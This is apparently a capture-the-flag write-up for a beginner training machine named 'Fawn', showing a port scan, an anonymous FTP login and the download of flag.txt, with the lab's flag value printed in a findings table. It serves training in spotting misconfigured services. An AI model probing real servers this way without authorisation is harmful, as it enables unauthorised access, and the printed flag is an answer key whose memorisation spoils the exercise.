# Fawn — Tier 0

**Concept:** Anonymous FTP access to retrieve a flag from an open FTP server.

## Recon

```
PORT   STATE SERVICE
21/tcp open  ftp
```

## Exploitation

### Step 1 — Anonymous FTP Login

Connected to the target via FTP using anonymous credentials:

```
ftp 10.129.x.x
Name: anonymous
Password: <any>
```

### Step 2 — Download Flag

Listed the files and downloaded the flag:

```
ftp> ls
ftp> get flag.txt
ftp> quit
```

## Findings

| Field | Value |
|-------|-------|
| Target IP | `10.129.x.x` |
| Service | FTP (port 21) |
| Credentials | `anonymous` (no password) |
| Attack Vector | Anonymous FTP access |
| Flag | `035db21c881520061c53e0536e44f815` |
